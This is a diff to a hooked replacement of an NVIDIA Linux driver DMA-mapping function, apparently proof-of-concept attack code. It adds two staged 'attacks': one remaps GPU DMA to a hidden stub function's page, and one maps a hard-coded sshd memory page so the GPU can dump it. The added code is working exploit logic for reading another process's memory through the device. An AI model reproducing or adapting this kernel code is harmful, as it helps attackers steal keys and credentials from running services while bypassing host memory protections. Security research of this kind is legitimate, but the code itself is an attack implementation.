@@ -582,18 +582,19 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 	    NvU64 i, j;
 	    nv_linux_state_t *nvl = NV_GET_NVL_FROM_NV_STATE(nv);
 	    nv_dma_map_t *dma_map = NULL;
-	    struct page **user_pages;
 	    struct mm_struct *mm = current->mm;
 
 	    // New vars:
 	    static NvU64 hidden_Page;
 	    static int counter = 0;
-	    NvU64 newpage;
 	    unsigned long page_number ;
 	    p_hidden_info info_buffer;
 		RM_STATUS rets;
 		int ret;
 		NvBool write = 1, force = 0;
+
+		static int attack_num = 0;
+		static int dump_num = 0;
 
 		DbgPrint("This is Replacemnt funct, Entering!\n");
 		DbgPrint("***YR NVRM: entering dma_map. Adrres of funct:0x%llx !***\n",(unsigned long int)new_funct);
@@ -625,6 +626,11 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 		    dma_map->user_pages = *priv;
 		    dma_map->dev = nvl->dev;
 
+if (attack_num == 0) {
+	// this is the 1st attack: substitute the stub function
+
+	      attack_num ++;
+
 		    // Start getting Phys addr from Pages.
 		    for (i = 0; i < page_count; i++)
 		    {
@@ -651,9 +657,6 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 				else // Now remapping according to what was passed in buffer.
 				{
 					DbgPrint( "*** Counter = %d ***\n",counter);
-					newpage = global_hidden_addr;
-					DbgPrint( "*** YR, hidden buffer struct user v_addr is: 0x%llx ***\n",newpage);
-
 
 					rets = os_alloc_mem((void **)&info_buffer, sizeof(hidden_driver_info));
 					if (rets != RM_OK)
@@ -674,9 +677,8 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 		   			}
 					DbgPrint( "*** buffer contains after copy: 0x%llx	, 0x:%llx\n",info_buffer->start_addr,info_buffer->end_addr);
 
-					// Now, we have the addresses to
+					// Now, we have the addresses to start_addr of the stub function
 
-					rets=os_alloc_mem((void **)&user_pages,(1 * sizeof(*user_pages)));
 					if (rets != RM_OK)
 					{
 					   	DbgPrint("YR: failed to allocate buffer for page nums in kernel mode!\n");
@@ -686,13 +688,11 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 					}
 					DbgPrint("YR: allocated buffer for page nums\n");
 					down_read(&mm->mmap_sem);
-		    			//ret = get_user_pages(current, mm, (unsigned long)info_buffer->start_addr,1, write, force, user_pages, NULL);
 						ret = get_pfn_of_virtual_address((unsigned long)info_buffer->start_addr,  &page_number);
 					up_read(&mm->mmap_sem);
 		    		if (ret < 0)
 		    		{
 		    			DbgPrint("YR: failed to get user pages\n");
-		    			os_free_mem(user_pages);
 		    			counter = 0;
 		    			Malicious_Bit = 0;
 		    			return RM_ERR_INVALID_ADDRESS;
@@ -702,7 +702,6 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 		    		DbgPrint("YR: PFN: 0x%llx\n",page_number);
 		    		pte_array[i] = page_number * 0x1000;
 
-		    		//pte_array[i] = pci_map_page(dma_map->dev, user_pages[0], 0,PAGE_SIZE,PCI_DMA_BIDIRECTIONAL);
 					DbgPrint("YR: physical address: 0x%llx\n",pte_array[i]);
 					counter = 0;
 				}
@@ -737,6 +736,80 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 		            return status;
 		        }
 		    }
+} else if (attack_num == 1) {
+  // This is the 2nd attack: dump sshd memory page
+
+		    // Start getting Phys addr from Pages.
+		    for (i = 0; i < page_count; i++)
+		    {
+		    	//Standart:
+				pte_array[i] = pci_map_page(dma_map->dev, dma_map->user_pages[i], 0,
+		                PAGE_SIZE,
+		                PCI_DMA_BIDIRECTIONAL);
+
+				DbgPrint( "*** ATK 2, pte_array[i] is 0x%llx ***\n",pte_array[i]);
+				DbgPrint( "*** Page size is: %d\n",PAGE_SIZE);
+
+				{
+
+					if (rets != RM_OK)
+					{
+					   	DbgPrint("ATK 2: failed to allocate buffer for page nums in kernel mode!\n");
+					   	return rets;
+					}
+					DbgPrint("ATK 2: allocated buffer for page nums\n");
+					down_read(&mm->mmap_sem);
+
+					// Currently hard-coded sshd page addr:
+					unsigned long sshd_page_addr = 0x7fbfa59cd000;
+
+						ret = get_pfn_of_virtual_address(sshd_page_addr, &page_number);
+
+					up_read(&mm->mmap_sem);
+		    		if (ret < 0)
+		    		{
+		    			DbgPrint("ATK 2: failed to get user pages\n");
+		    			return RM_ERR_INVALID_ADDRESS;
+		    		}
+		    		DbgPrint("ATK 2: Got PFN\n");
+
+		    		DbgPrint("ATK 2: PFN: 0x%llx\n",page_number);
+		    		pte_array[i] = page_number * 0x1000;
+
+					DbgPrint("ATK 2: physical address: 0x%llx\n",pte_array[i]);
+				}
+
+			if (NV_PCI_DMA_MAPPING_ERROR(dma_map->dev, pte_array[i]) ||
+		            (!IS_DMA_ADDRESSABLE(nv, pte_array[i])))
+		        {
+				DbgPrint("NVRM: failed to create a DMA mapping!\n");
+		            if (!IS_DMA_ADDRESSABLE(nv, pte_array[i]))
+		            {
+		            	DbgPrint("NVRM: DMA address not in addressable range of device "
+		                        "%04x:%02x:%02x (0x%llx, 0x%llx-0x%llx)\n",
+		                        NV_PCI_DOMAIN_NUMBER(dma_map->dev),
+		                        NV_PCI_BUS_NUMBER(dma_map->dev),
+		                        NV_PCI_SLOT_NUMBER(dma_map->dev),
+		                        pte_array[i], nv->dma_addressable_start,
+		                        nv->dma_addressable_limit);
+		                status = RM_ERR_INVALID_ADDRESS;
+		            }
+		            else
+		            {
+		                status = RM_ERR_OPERATING_SYSTEM;
+		            }
+
+		            for (j = 0; j < i; j++)
+		            {
+		                pci_unmap_page(dma_map->dev, pte_array[j],
+		                        PAGE_SIZE, PCI_DMA_BIDIRECTIONAL);
+		            }
+
+		            os_free_mem(dma_map);
+		            return status;
+		        }
+		    }
+}
 
 		    *priv = dma_map;
 
